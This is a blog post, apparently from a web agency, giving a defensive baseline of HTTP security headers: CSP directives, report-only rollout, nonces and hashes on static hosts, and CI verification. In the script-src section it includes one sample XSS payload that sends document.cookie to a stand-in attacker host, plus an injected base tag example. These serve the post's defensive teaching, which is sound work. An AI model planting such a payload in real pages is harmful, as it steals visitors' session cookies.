---
title: "CSP without the tears: a security baseline for content sites"
description: "A copy-paste security headers baseline for content sites: Content-Security-Policy with nonces, report-only rollout, and the headers nobody checks until audit."
slug: security-headers-csp-baseline
cluster: engineering
tags:
  - security
  - http
  - frontend-infrastructure
  - compliance
date: 2026-03-05
author: Felix Brandt
keywords:
  - CSP
  - security headers
  - web security baseline
  - content security policy
readingTime: 12
---

There are two ways teams meet their Content Security Policy. The good way: deliberately, on a staging environment, with coffee, during a quiet sprint. The other way: the night before a compliance audit, after a pen-tester's report used the phrase "it is trivially possible to," with the whole team learning what `unsafe-inline` means at 11pm.

This article exists so you can have the first version. Security headers are, pardon the phrase, deeply boring — which is why everyone procrastinates on them until they're suddenly urgent. Here's the baseline Brassfern applies to every content site we ship: the exact headers, the rollout order, the static-host workarounds, and the traps we've already fallen into so you don't have to.

## The baseline, in full

Before the philosophy, the thing itself. This is the configuration that ships on every Brassfern content site — your CMS-driven marketing site, your docs hub, your [growth practice's](/services/growth) latest editorial platform:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  upgrade-insecure-requests

Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

Six lines of CSP, seven supporting headers, none of them exotic. This blocks XSS via injected script tags, clickjacking, MIME sniffing, and the majority of drive-by mischief. It passes most audits outright. And it's the starting point — the rest of this article is about what each line does, what to change, and what breaks.

## The CSP lines, explained like a colleague would

**`default-src 'self'`** — the fallback: anything not named explicitly must come from your own origin. This is the line that does most of the work. Everything after is exceptions.

**`script-src 'self' 'nonce-{NONCE}'`** — the big one: scripts only from your origin, *or* carrying a one-time nonce that your server put there. Inline `<script>` without a nonce is dead. This kills the classic XSS attack where an attacker injects `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>` into a comment field. The nonce is per-request and unguessable, so the attacker's script (which can't know the nonce) never runs. More on nonces below, because static hosts complicate them.

**`style-src 'self' 'unsafe-inline'`** — the pragmatic compromise. `'unsafe-inline'` for *styles* is low-risk in a way that absolutely isn't true for scripts, and content sites with rich prose often need inline styles (CMS-rendered colour swatches, syntax highlighting, your [design tokens pipeline](/journal/engineering/design-tokens-pipeline) emitting theme variables inline). You can tighten this with nonces too, but the cost/benefit rarely clears — lock down scripts first.

**`img-src 'self' data: https:`** — images from your origin, from data URIs (inline SVGs, tiny placeholders), and from any HTTPS origin. "Any HTTPS origin" is broad and that is deliberate: blocking third-party images breaks OG images, CDN-hosted editorial assets, and half the legitimate web. Image injection is a nuisance, not an XSS vector. The risk we accept; the breakage we don't.

**`font-src 'self'`** and **`connect-src 'self'`** — fonts local (you're already [loading fonts from your own origin](/journal/engineering/font-loading-performance-recipes) for performance, right?), XHR/fetch to your origin. When the analytics script needs `connect-src` to its endpoint, add the *specific* origin, never a wildcard.

**`frame-ancestors 'none'`** — nobody embeds this site in an iframe, ever. Clickjacking dies here. (Yes, `X-Frame-Options: DENY` says the same thing in the older dialect; legacy browsers read one, modern browsers read the other, so ship both. Security headers are one of the few places where redundancy is free.)

**`form-action 'self'`** — forms can only submit to your origin. This stops an injected form from exfiltrating the credentials your users type into it, which is the attack your phishing-conscious users will thank you for never experiencing.

**`base-uri 'self'`** — an injected `<base href="https://evil.example/">` silently rewrites every relative URL on the page. Nobody remembers this directive exists; it's the one pen-testers check first.

**`upgrade-insecure-requests`** — browsers fetch every `http://` subresource as `https://` instead before the request leaves. If your site is HTTPS-only (it is), this is free insurance for the one CMS author who pastes an `http://` image URL at 4pm on a Friday.

## The rollout: report-only, then enforce, then tighten

The single most important operational decision: **your first CSP is `Content-Security-Policy-Report-Only`.** Nothing breaks. The browser reports violations to an endpoint you control instead of blocking. You collect real-world data about every script, image, frame and connection your actual pages make — including the ones the third-party team added last year, the ones the CMS injects without telling you, and the ones your local dev tools hid from you.

In our experience, two weeks of report-only on production traffic surfaces an average of five "we had no idea that ran on our site" findings per engagement. The [third-party scripts audit](/journal/engineering/third-party-scripts-audit) write-up covers what to *do* with those findings; CSP reporting is how you discover them without finding out from a pen-tester.

Then: enforce. Then, weeks later, tighten — because report-only with `unsafe-inline` scripts is a tripwire, not a wall.

## Nonces on a static host: the workaround you actually want

The honest problem with the baseline above is `'nonce-{NONCE}'`. A nonce must be generated per-request by a server, and content sites increasingly deploy to static hosts and CDNs with no per-request server at all. Three workable answers, in order of preference:

1. **A nonce at the edge.** Most CDN platforms (Cloudflare Workers, Fastly Compute, Netlify Edge) can inject a fresh nonce into HTML at the edge, cheaply. This is the clean answer and our default.
2. **Hashes for known-inline scripts.** If you have a small number of inline scripts (an analytics bootstrap, a theme-detection snippet), compute their SHA-256 hashes at build time and put `'sha256-...'` in the policy instead of a nonce. Inline scripts that match the hash run; all others die. Build tooling emits the hashes alongside the HTML; whenever an inline script changes, the hash changes, and everyone's forced to notice. This is excellent *because* it's brittle — change has to go through the build.
3. **No inline scripts at all.** The radical answer. Build tooling that refuses to emit inline `<script>` (config as external files, bootstraps as modules). Works beautifully when you control the build pipeline; painful when CMSs inject scripts.

What you do *not* do: `'unsafe-inline'` on scripts "temporarily," for longer than a sprint. We've audited too many sites where the temporary exception had a birthday. If scripts must ship while you sort the nonce strategy, scope `unsafe-inline` to the *specific page* by serving a different policy for that route — one page is a problem, a site-wide hole is a policy failure.

## The supporting headers, briefly

Seven one-line headers do non-CSP work. Each is one attack it prevents:

- **HSTS** — after the first HTTPS visit, the browser *refuses* HTTP to your domain for the next two years, and your domain can join the browser preload list. The `preload` token gets you baked into the browsers themselves. Apply deliberately; un-preloading is slow.
- **X-Content-Type-Options: nosniff** — the browser serves a `.jpg` as a JPEG even if its content looks like JavaScript. Prevents a 2008-era attack that keeps working wherever this header is missing, which is still a lot of places.
- **Referrer-Policy** — your internal URLs stop leaking into the `Referer` header of every outbound link. `strict-origin-when-cross-origin` keeps useful referrer data for your own analytics, sends only the origin cross-site.
- **Permissions-Policy** — the browser feature flags. A marketing site has no business requesting camera, microphone, or geolocation access; the policy makes that a guarantee rather than an assumption. Also the answer to "what's `interest-cohort`?" — it opts out of Chrome's old FLoC tracking experiment; harmless to keep, costs nothing.
- **COOP/CORP** — cross-origin isolation primitives. `same-origin` on both is the safe default for content sites and prevents a class of side-channel attacks. If you embed third-party iframes (video players, payment widgets), CORP becomes the header that decides whose resources they can load; set it deliberately or the embed breaks mysteriously.

## The verification habit

Apply the headers. Then verify, automatically:

- A CI check (a `curl` against the deployed URL, asserting each header) runs on every deploy. Headers that silently vanish during a CDN configuration change get caught in the pipeline, not the audit. This pairs naturally with the [preview environments per-PR](/journal/engineering/preview-environments-every-pr) habit — the header check runs against previews too, so misconfiguration is visible *before* production.
- A quarterly scan with an external scanner. Not because the CI check isn't enough, but because the external scanner sees the site the way auditors and attackers do — from outside, cold, sceptical.
- A report-collection endpoint that actually gets read. CSP violation reports are telemetry; they belong on the same dashboard as everything else, following the principle from our [frontend observability guide](/journal/engineering/frontend-observability-small-teams): deltas surface, dashboards get reviewed.

Three habits, one quarter-hour per quarter, and the phrase "trivially possible to" never appears in a report about your site.

## What CSP won't save you from

A closing act of honesty, because CSP articles love to oversell: CSP blocks *injected* code from running. It does not fix your own XSS (the sanitiser you trusted too much), your dependency vulnerabilities (CSP doesn't stop your own npm package from being malicious — that's a [supply-chain problem](/journal/engineering/supply-chain-security-js-teams)), or your phishing problem (your own form on your own domain, doing harm, is policy-compliant). It's a floor, not a ceiling. But it's a floor most content sites don't have, and it costs a day to install and an hour a quarter to keep.

## Key takeaways

- A practical CSP baseline for content sites is six directives plus seven supporting headers. `default-src 'self'`, nonce-based scripts, no framing, no base-tag injection — one afternoon of deliberate work.
- Always roll out report-only first, on production traffic, for two weeks. The violations it finds are the audit findings you get to fix before an auditor does.
- Static hosts aren't an excuse: nonce at the edge, SHA-256 hashes for fixed inline scripts, or no inline scripts at all. Never `unsafe-inline` on scripts "temporarily."
- `frame-ancestors 'none'`, `form-action 'self'`, and `base-uri 'self'` block the attacks pen-testers check first and developers remember last.
- Verify in CI, scan quarterly, and route violation reports somewhere they'll be read. Headers that vanish between deploys are found by CI, not by audits.

## FAQ

**Isn't CSP overkill for a marketing site with no login?** No. Marketing sites get defaced via XSS, used as phishing redirection hosts, and injected with cryptominers through compromised analytics more often than transactional apps do, precisely because nobody hardened them. A site with no login still has a reputation to spend.

**Won't CSP break our tag manager and A/B testing tools?** Sometimes, yes, and that information is valuable. Tag managers that inject arbitrary scripts are the `unsafe-inline` you were about to allow by accident. The honest options: scope exceptions to specific origins, move A/B testing server-side, or accept a wider policy for that tool *as a documented decision*, reviewed quarterly. The sin isn't the trade-off; it's the trade-off nobody remembers making.

**How do we handle CSP with a CMS where editors embed things?** Editors embed, CSP blocks, editors complain. The answer is a policy that allows the *specific* providers you support (YouTube, Vimeo, your payment widget) via explicit origins, and a documented process for adding new ones. Wildcards are not a compromise; they're quit.

**Our audit already happened and we have exceptions to close — where do we start?** Report-only CSP on production, today, with the baseline above. In two weeks you'll have the full list of what your pages actually load. Fix from that list, not from the audit's examples. Most "six-month CSP projects" are six weeks of report-only and an afternoon of decisions.

---

*Security is a build artifact, not a line item. It's how we ship every [website](/services/websites) — [see how we work](/approach) or [bring us your next launch](/contact).*
